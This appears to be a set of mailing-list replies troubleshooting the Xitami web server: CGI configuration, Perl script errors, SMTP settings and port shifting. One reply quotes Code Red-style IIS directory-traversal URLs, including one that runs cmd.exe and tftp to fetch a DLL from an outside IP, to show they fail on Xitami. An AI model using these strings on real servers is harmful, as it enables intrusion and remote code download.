For months I have been trying to figure out why it would crash every couple
of hours.  A couple weeks ago my computer starting crashing literally every
5 minutes.  I spent this weekend trying to figure that out.  What finally
fixed it was taking out one of the processors.

It's an Abit VP6 board with 2 PIII 700's. I pulled one of the PIII's,
restarted the machine and everything has worked fine for a week now, haven't
had to restart anything once.  Not sure what is actually wrong, I didn't try
putting the CPU back in and pulling the other.  I may have gotten lucky and
pulled a bad cpu the first try but I would bet it's the board.  If it's
hardware related that is.  So I am either going to get a different dual
board, or get a new board and newer processors.


Thanks to all who tried to help me "fix" Xitami.

"Neil Finlayson" <nfinlayson@neco-services.mine.nu> wrote:

> But before i upgraded i had such directories as
> test/somedir/cgi-bin/some.cgi
> which all worked fine.

Check the wildcard setting in the [CGI] section of defaults.cfg.  It 
is possible that you changed this in Xitami.cfg when you originally 
installed Xitami (instead of creating defaults.cfg) and have now lost 
the setting after reinstalling Xitami/Pro.

This is the relevant setting:

[CGI]
#   Defines whether the CGI URL indicator ('/cgi-bin') is allowed
#   anywhere in the URL, or only at the start. If 1, it is allowed
#   anywhere in the URL. If 0, it may come only at the start of the
#   URL. Note that setting this to 1 opens a significant security
#   hole, if you also allow people to FTP files into the HTTP area. As
#   soon as someone creates a directory called /cgi-bin, they can
#   upload, and execute, CGI programs.

    wildcard=0

This looks like a Perl cgi error if you found the error in cgierr.log
located in the main Xitami directory. It means your browser's request
managed both to find the url and to execute the cgi script, however
there is an error in the cgi script at line 2 .

The Perl interpreter stops execution of the program and issues a warning
which is written to the standard error, the cgierr.log.

Open with a text editor your script file located at:
webpages/cgi-bin/2.cgi
at line 2 of this 2.cgi there should be some code which the perl
interpreter
can not execute.

What does it say at line 2?  If it says something like this:

require 'sub.txt';

this means that you have neglected to copy over from your old
directories
an individual file by the name of  sub.txt  which your cgi program has
to
find and read before it can go any further. You should find this sub.txt
file and copy it over to the same directory that 2.cgi is in.

> Xitami allows this kind of script processing to occur.

How do you know the scripts are actually running?

The 200 response only means Xitami was happy with what it did. That
does not prove it did what the hacker hoped.

Also, isn't the response length -1 for all of these?

Those requests are illegally encoded. In IIS, they invoke a bug in
IIS's URL decoder. In Xitami they are trimmed-off at the illegal
point and what is left is handled. For most CodeRed hacks, this is
either the root default or a subdirectory you probably don't have.

Take one of those hacks and try it yourself.

http://myserver.edu/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir

Gives me a Not Found.


On the tftp one, edit it to a script of your choice. Like a HIT_ME.BAT file:

 echo "you got me!" >> hit_me.txt

/scripts/..%%35%63../winnt/system32/cmd.exe?/c+hit_me%20-i%20208.179.58.54%20G
ET%20cool.dll%20e:\httpodbc.dll HTTP/1.0"

If the cmd.exe?/c+hit_me hack works, it will append to hit_me.txt.
You will find that it does NOT work under Xitami (nor even under a
properly patched IIS).

 -PRR

> I must point the script to the SMTP address of the server,

Actually, "any" SMTP server that will accept email for delivery to
the recipient.

You must have an SMTP server set in your regular email program
(OutLook, NetScape Mail, Eudora, etc). This will usually be your
ISP's main post-office machine. Try that in your script.

Problem is: because of abuse, most SMTP machines no longer take
email from strangers (back in the good old days, they did). Some of
them will take email from any machine inside the domain's IP ranges.
Some expect you to authenticate with a password protected get Mail
operation first.

At home, your ISP's SMTP may work fine. On a hosted webserver, ask
the hosting outfit what to use for SMTP.

 -PRR

* Go to the Xitami root directory
* Look for a file default.cfg, if not present, create one
* Add an entry

[Server]
         Portbase=1000

(or any other value).
This will shift all ports by 1000, also the ftp port if used.
(http = 1080)
* Restart server

Do not modify xitami.cfg, changes will be overwritten, but you can peek at 
it to see all available parameters that can be modified.

It will also more likely occur on a FAT drive than on a NTFS drive (with 
it's backtracking ability)
